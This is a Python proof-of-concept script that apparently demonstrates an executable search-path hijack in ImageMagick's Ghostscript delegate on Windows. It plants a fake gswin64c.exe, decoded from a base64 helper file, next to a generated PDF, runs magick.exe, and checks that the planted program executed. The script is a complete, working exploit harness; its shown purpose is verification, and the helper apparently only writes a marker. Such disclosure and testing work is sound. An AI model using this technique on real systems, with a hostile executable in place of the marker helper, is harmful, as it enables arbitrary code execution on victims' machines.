#!/usr/bin/env python3
import argparse
import base64
import hashlib
import json
import os
import platform
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path


def sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            h.update(chunk)
    return h.hexdigest().upper()


def build_pdf():
    objects = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 72 72] /Contents 4 0 R >>",
        b"<< /Length 38 >>\nstream\n0.1 0.4 0.8 rg\n10 10 52 52 re\nf\nendstream",
    ]
    out = bytearray(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")
    offsets = [0]
    for index, body in enumerate(objects, start=1):
        offsets.append(len(out))
        out.extend(f"{index} 0 obj\n".encode("ascii"))
        out.extend(body)
        out.extend(b"\nendobj\n")
    xref = len(out)
    out.extend(f"xref\n0 {len(objects) + 1}\n".encode("ascii"))
    out.extend(b"0000000000 65535 f \n")
    for offset in offsets[1:]:
        out.extend(f"{offset:010d} 00000 n \n".encode("ascii"))
    out.extend(f"trailer\n<< /Size {len(objects) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n".encode("ascii"))
    return bytes(out)


def run(cmd, cwd, env):
    return subprocess.run(
        cmd,
        cwd=str(cwd),
        env=env,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        shell=False,
    )


def find_exe(name, explicit):
    if explicit:
        path = Path(explicit).expanduser().resolve()
        if not path.exists():
            raise SystemExit(f"{name} was not found: {path}")
        return path
    found = shutil.which(name)
    if not found:
        raise SystemExit(f"{name} was not found in PATH; pass its path explicitly")
    return Path(found).resolve()


def write_text(path, text):
    path.write_text(text, encoding="utf-8", errors="replace")


def load_helper_payload():
    payload = Path(__file__).resolve().parent / "helper" / "gswin64c.exe.b64"
    if not payload.exists():
        raise SystemExit(f"helper payload missing: {payload}")
    return base64.b64decode("".join(payload.read_text(encoding="ascii").split()))


def main():
    parser = argparse.ArgumentParser(description="ImageMagick Ghostscript delegate executable search-path PoC")
    parser.add_argument("--magick", help="Path to magick.exe. Defaults to magick.exe in PATH.")
    parser.add_argument("--gs-bin", help="Directory containing the real gswin64c.exe. Defaults to PATH lookup.")
    parser.add_argument("--magick-configure-path", help="Optional ImageMagick config directory for portable builds.")
    parser.add_argument("--workdir", help="Directory for generated PoC files. Defaults to a temp directory.")
    args = parser.parse_args()

    if platform.system() != "Windows":
        raise SystemExit("This PoC exercises ImageMagick's Windows delegate launcher path. Run it on Windows with Python 3.")

    magick = find_exe("magick.exe", args.magick)
    if args.gs_bin:
        gs_bin = Path(args.gs_bin).expanduser().resolve()
        gs_exe = gs_bin / "gswin64c.exe"
        if not gs_exe.exists():
            raise SystemExit(f"gswin64c.exe was not found in --gs-bin: {gs_bin}")
    else:
        gs_exe = find_exe("gswin64c.exe", None)
        gs_bin = gs_exe.parent

    if args.workdir:
        root = Path(args.workdir).expanduser().resolve()
        root.mkdir(parents=True, exist_ok=True)
    else:
        root = Path(tempfile.mkdtemp(prefix="im-gs-delegate-poc-")).resolve()

    control = root / "control"
    hijack = root / "hijack"
    fallback = root / "ghostscript-path-without-dll"
    for directory in (control, hijack, fallback):
        directory.mkdir(parents=True, exist_ok=True)

    for directory in (control, hijack):
        (directory / "benign.pdf").write_bytes(build_pdf())

    helper = hijack / "gswin64c.exe"
    helper.write_bytes(load_helper_payload())
    marker = hijack / "marker.txt"

    env = os.environ.copy()
    env["PATH"] = str(gs_bin) + os.pathsep + env.get("PATH", "")
    env["MAGICK_GHOSTSCRIPT_PATH"] = str(fallback)
    env["IM_GS_MARKER"] = str(marker)
    if args.magick_configure_path:
        env["MAGICK_CONFIGURE_PATH"] = str(Path(args.magick_configure_path).expanduser().resolve())

    magick_version = run([str(magick), "-version"], root, env)
    gs_version = run([str(gs_exe), "--version"], root, env)
    control_result = run([str(magick), "-verbose", "benign.pdf", "control.png"], control, env)
    hijack_result = run([str(magick), "-verbose", "benign.pdf", "hijack.png"], hijack, env)

    write_text(control / "stdout.txt", control_result.stdout)
    write_text(control / "stderr.txt", control_result.stderr)
    write_text(hijack / "stdout.txt", hijack_result.stdout)
    write_text(hijack / "stderr.txt", hijack_result.stderr)

    marker_text = marker.read_text(encoding="utf-8", errors="replace") if marker.exists() else ""
    result = {
        "workdir": str(root),
        "magick": {
            "path": str(magick),
            "sha256": sha256(magick),
            "version": magick_version.stdout.strip(),
        },
        "ghostscript": {
            "path": str(gs_exe),
            "sha256": sha256(gs_exe),
            "version": gs_version.stdout.strip(),
        },
        "helper": {
            "path": str(helper),
            "sha256": sha256(helper),
        },
        "control": {
            "exit_code": control_result.returncode,
            "output_png": str(control / "control.png"),
            "output_exists": (control / "control.png").exists(),
        },
        "hijack": {
            "exit_code": hijack_result.returncode,
            "marker": str(marker),
            "marker_exists": marker.exists(),
            "marker_text": marker_text,
        },
    }

    result_path = root / "result.json"
    result_path.write_text(json.dumps(result, indent=2), encoding="utf-8")

    print(json.dumps(result, indent=2))
    if not result["control"]["output_exists"]:
        raise SystemExit("Control conversion did not produce output; check control/stderr.txt")
    if not result["hijack"]["marker_exists"]:
        raise SystemExit("Hijack marker was not written; check hijack/stderr.txt")
    if "fake gswin64c executed" not in marker_text:
        raise SystemExit("Hijack marker did not contain the expected helper output")
    print(f"\nPoC verified. Evidence directory: {root}")


if __name__ == "__main__":
    sys.exit(main())
